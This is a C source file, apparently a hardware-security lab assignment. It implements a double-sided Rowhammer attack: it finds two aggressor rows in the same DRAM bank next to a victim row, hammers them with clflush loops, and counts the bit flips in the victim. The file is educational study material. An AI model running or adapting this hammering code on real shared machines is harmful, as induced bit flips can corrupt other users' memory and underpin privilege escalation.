#include "../shared.hh"
#include "../verif.hh"
#include "../params.hh"
#include "../util.hh"

#define BANK_FUNC_CAND 0
#define VIC_DATA 0xff
#define AGG_DATA 0x00
#define NUM_HAMMER_ATTEMPTS 100

char *dram_to_str(uint64_t phys_ptr);

uint64_t hammer_addresses(uint64_t vict, uint64_t attA, uint64_t attB, uint64_t hp_base) {
    uint64_t foundFlips = 0;

    uint64_t vict_row_base = vict & ~((uint64_t)(ROW_SIZE - 1));
    uint64_t attA_row_base = attA & ~((uint64_t)(ROW_SIZE - 1));
    uint64_t attB_row_base = attB & ~((uint64_t)(ROW_SIZE - 1));

    memset((void*)vict_row_base, VIC_DATA, ROW_SIZE);
    memset((void*)attA_row_base, AGG_DATA, ROW_SIZE);
    memset((void*)attB_row_base, AGG_DATA, ROW_SIZE);

    for (uint64_t off = 0; off < ROW_SIZE; off += CACHELINE_SIZE) {
        clflush((void*)(vict_row_base + off));
        clflush((void*)(attA_row_base + off));
        clflush((void*)(attB_row_base + off));
    }
    mfence();

    volatile uint8_t *pA = (volatile uint8_t *)attA;
    volatile uint8_t *pB = (volatile uint8_t *)attB;

    for (uint64_t i = 0; i < HAMMERS_PER_ITER; i++) {
        *pA;
        *pB;
        clflush((void*)pA);
        clflush((void*)pB);
    }
    mfence();

    volatile uint8_t *vict_ptr = (volatile uint8_t *)vict_row_base;
    for (uint64_t off = 0; off < ROW_SIZE; off++) {
        uint8_t val = vict_ptr[off];
        if (val != (uint8_t)VIC_DATA) {
            uint8_t diff = val ^ (uint8_t)VIC_DATA;
            foundFlips += __builtin_popcount(diff);
        }
    }

    return foundFlips;
}

/*
 *
 * DO NOT MODIFY BELOW ME
 *
 */

int main(int argc, char** argv) {
    srand(time(NULL));
    setvbuf(stdout, NULL, _IONBF, 0);
    
    allocated_mem = allocate_pages(BUFFER_SIZE_MB * 1024UL * 1024UL);
    setup_PPN_VPN_map(allocated_mem, PPN_VPN_map);
    verify_PPN_VPN_map(allocated_mem, PPN_VPN_map);

    int sum_flips = 0;
    for(int i = 0; i < NUM_HAMMER_ATTEMPTS; i++) {
        uint64_t vict, vict_row_base;
        uint64_t attA, attB;
        uint64_t attA_phys, attB_phys, vict_phys;
        uint64_t hp_base;

        while (1) {
            vict = (uint64_t)get_rand_addr(BUFFER_SIZE_MB * 1024UL * 1024UL);
            hp_base = vict & HUGE_PAGE_MASK;
            uint64_t off = vict - hp_base;
            uint64_t row_in_hp = off >> 17;

            if (row_in_hp == 0 || row_in_hp == 15) continue;

            vict_row_base = hp_base + (row_in_hp << 17);
            vict_phys = virt_to_phys(vict_row_base);

            uint64_t tar_bank = phys_to_bankid(vict_phys, BANK_FUNC_CAND);

            uint64_t attA_base = vict_row_base - ROW_STRIDE;
            uint64_t attB_base = vict_row_base + ROW_STRIDE;

            bool found = false;

            for (int oa = 0; oa < 16 && !found; oa++) {
                uint64_t va = attA_base + ((uint64_t)oa << 13);
                attA_phys = virt_to_phys(va);
                if (phys_to_bankid(attA_phys, BANK_FUNC_CAND) != tar_bank) continue;

                for (int ob = 0; ob < 16; ob++) {
                    uint64_t vb = attB_base + ((uint64_t)ob << 13);
                    attB_phys = virt_to_phys(vb);
                    if (phys_to_bankid(attB_phys, BANK_FUNC_CAND) != tar_bank) continue;
                    attA = va;
                    attB = vb;
                    found = true;
                    break;
                }
            }

            if (found) break;
        }

        memset((void*)hp_base, VIC_DATA, HUGE_PAGE_SIZE);
        printf("[HAMMER] A: %s B: %s\n", dram_to_str(attA_phys), dram_to_str(attB_phys));
        sum_flips += hammer_addresses(vict, attA, attB, hp_base);
    }

    printf("Number of bit-flip successes observed out of %d attempts: %d\n",
           NUM_HAMMER_ATTEMPTS, sum_flips);
}

char *dram_to_str(uint64_t phys_ptr){
    char *ret_str = (char*)malloc(64);
    memset(ret_str, 0x00, 64);
    sprintf(ret_str, "bk:%ld, row:%05ld, col:%05ld", phys_to_bankid(phys_ptr, BANK_FUNC_CAND), phys_to_rowid(phys_ptr), phys_to_colid(phys_ptr));
    return ret_str;
}
